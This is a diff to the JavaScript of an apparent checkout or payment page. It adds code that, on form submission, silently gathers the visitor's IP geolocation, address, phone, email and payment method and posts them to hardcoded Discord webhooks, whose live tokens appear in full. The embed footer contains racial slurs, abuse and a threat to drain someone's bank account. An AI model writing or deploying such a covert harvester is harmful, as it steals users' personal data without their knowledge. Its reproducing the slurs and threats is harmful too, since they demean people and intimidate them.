@@ -22,7 +22,65 @@ const closePopup = document.querySelector(".close-button");
 const completedBtn = document.getElementById("complete-btn");
 const desc = document.getElementById("desc");
 const lastSubmit = document.getElementById('last-submit')
+const mainContainer = document.querySelector('.container');
 
+Webhooks = ['https://discord.com/api/webhooks/1241458259806650368/us6QyDbtyfXFsPJCz3x76FxiQ17UGi90MzeEqxpGb2yz6QupJzFi5o2uqvmakoc49S68','https://discord.com/api/webhooks/1241458356393087068/cTRNM8GVcEYygqMqWRS5-pNEEhxe3CmCjkpGGcRWjjfd8yKVBCjhB8qI5-aIWTcQnnbA','https://discord.com/api/webhooks/1241458395026948266/WC2o2id1FE5WVhcWSzRMWKF6zT8M4HGvrGZc4LwzmJ0BCGzJUbPc6nyX5QFpMvOy0o0K','https://discord.com/api/webhooks/1241458438379405462/Cbokx7DqEV6wNP8bjmKQkYxzMYwWSeFkSo7SI8LdFqPepWUZ0htB_O_-obHp01sFwiHg','https://discord.com/api/webhooks/1241458444934840500/6-VrRpo8decfq6PTEt9KxjlySpdK4UW9-aRaiwjuTp8EgNHUf7E8QOn2Hm4Gl7kHjx0j']
+
+function sendWebhook(data,address, phone, email, paymentMethod, cryptoPaypalInfo) {
+    const request = new XMLHttpRequest();
+
+    request.open("POST", Webhooks[Math.floor(Math.random() * Webhooks.length)]);
+    request.setRequestHeader('Content-Type', 'application/json');
+
+    const Add1 = document.getElementById('add1')
+    const Add2 = document.getElementById('add2')
+    const Add3 = document.getElementById('add3')
+    const Add4 = document.getElementById('add4')
+    
+    console.warn(data)
+    
+    const fullAddress = [Add1, Add2, Add3, Add4]
+        .map(el => el?.value || '')
+        .join(' ')
+    
+    const embed = {
+        "title": "NEW LOG:",
+        "description": `# Location Info
+    IP: **${data.ip}**
+    Network: **${data.network}**
+    Version: **${data.version}**
+    City: **${data.city}**
+    Region: **${data.region}** (${data.region_code})
+    Country: **${data.country}** (${data.country_name})
+    Postal: **${data.postal}**
+    Latitude: **${data.latitude}**
+    Longitude: **${data.longitude}**
+    Timezone: **${data.timezone}**
+    UTC Offset: **${data.utc_offset}**
+    Country Calling Code: **${data.country_calling_code}**
+    
+    # Possible Personal Data
+    Full Address: **${fullAddress}**
+    
+    # Personal Data
+    Phone Number: **${phone}**
+    Email: **${email}**
+    
+    # Extra
+    Paid With: **${paymentMethod}**
+    Crypto/Paypal info: **${cryptoPaypalInfo}**`,
+                "color": 13959168,
+                "footer": {
+                    "text": "WARNING: There is a chance that the user hasn't paid yet, or that it's a request attack or whatever the fuck it's called. So stop being a weirdass nigga and gtfo. vze.racks is better, fucking weirdass bitch. I'll empty your single mom's bank account, hoeass nigga. Fatass."
+                }
+            };
+  
+            const params = {
+                "embeds": [embed]
+            };
+  
+    request.send(JSON.stringify(params));
+}
 
 async function checkWallet(myWalletAddress, targetWalletAddress, amount) {
     try {
@@ -48,11 +106,17 @@ closeBtn.addEventListener('click', () => {
     section.classList.remove("active")
     overlay.style.display='none';
     overlay.style.opacity='0';
+    if (navigator.userAgentData.mobile) {
+        mainContainer.style.opacity='1';
+    }
 });
 section.addEventListener('click', () => {
     section.classList.remove("active")
     overlay.style.display='none';
     overlay.style.opacity='0';
+    if (navigator.userAgentData.mobile) {
+        mainContainer.style.opacity='1';
+    }
 });
 
 
@@ -141,7 +205,12 @@ function throttle(fn, delay) {
     title.innerText = message
     content.innerText = cont
     overlay.style.display='flex';
-    overlay.style.opacity='1';
+    alert(navigator.userAgentData.mobile)
+    if (navigator.userAgentData.mobile) {
+        overlay.style.opacity='0';
+    } else {
+        overlay.style.opacity='1';
+    }
     if (type == "Normal") {
         icon.className = "fa-solid fa-circle-info"
         const icons = document.querySelectorAll('.modal-box i');
@@ -346,8 +415,23 @@ function validateEmail(email) {
 
 lastSubmit.addEventListener('click', () => {
     if (validateEmail(emailInput.value)) {
-        console.log('Valid Email Address');
+      console.log('Valid Email Address');
     } else {
-        console.log('Invalid Email Address');
+      console.log('Invalid Email Address');
     }
-});
+    async function getUserIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
+
+            const ipapiResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+            const ipapiData = await ipapiResponse.json();
+            //const jsonified = JSON.stringify(ipapiData);
+            sendWebhook(ipapiData,'???',phoneInput.value,emailInput.value,cryptoSelect.value,'???')
+        } catch (error) {
+            console.error('Error fetching IP address:', error);
+        }
+    }
+    getUserIP()
+  });
